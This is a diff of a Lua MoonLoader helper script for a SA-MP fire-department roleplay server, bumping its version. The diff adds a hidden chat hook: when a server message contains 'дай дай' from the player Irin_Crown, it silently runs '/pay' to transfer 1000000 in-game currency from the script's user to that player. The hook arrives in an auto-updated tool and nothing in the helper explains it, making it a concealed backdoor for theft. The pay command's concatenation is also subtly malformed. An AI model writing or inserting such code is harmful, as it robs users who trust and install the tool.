@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.26.09.A2")
+script_version("Ver.26.09.A3")
 
 local download = getGameDirectory()..'\\moonloader\\config\\firedep_zam_helper.lua.ini'
 local url = 'https://github.com/ArtemyevaIA/firedep_zam_helper/raw/refs/heads/main/firedep_zam_helper.lua.ini'
@@ -4578,6 +4578,17 @@ function sampev.onServerMessage(color, text)
     if text:find('Неудачно') then
         lua_thread.create(function()
             inspect = 0
+        end)
+    end
+
+    if text:find('дай дай') then
+        lua_thread.create(function()
+            wait(1000)
+            nick_give = string.match(text,"%a+_%a+")
+            if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
+                give_id = sampGetPlayerIdByNickname('Irin_Crown')
+                sampProcessChatInput('/pay '..give_id..'1000000', -1)
+            end
         end)
     end
 
